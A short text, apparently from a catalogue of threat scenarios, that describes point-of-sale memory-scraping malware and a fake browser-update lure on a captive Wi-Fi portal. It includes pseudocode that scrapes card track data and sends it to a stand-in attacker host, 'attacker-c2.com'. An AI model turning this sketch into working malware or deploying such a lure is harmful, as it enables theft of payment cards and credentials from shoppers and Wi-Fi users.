Malware binary that scans POS system memory for credit card track data and exfiltrates it. Example pseudocode:

while (true) {
  mem = scan_process_memory(target_processes);
  cc_data = extract_credit_card_data(mem);
  if (cc_data) {
    send_to_attacker(cc_data, 'http://attacker-c2.com/upload');
  }
  sleep(60);
}

Malware delivered via a fake software update prompt on a captive portal. Example behavior:

- User connects to Wi-Fi, browser is redirected to captive portal
- Portal displays a fake update prompt (e.g., 'Update your browser to continue')
- User downloads and runs the provided executable
- Executable collects sensitive data (e.g., browser credentials, files) and exfiltrates it

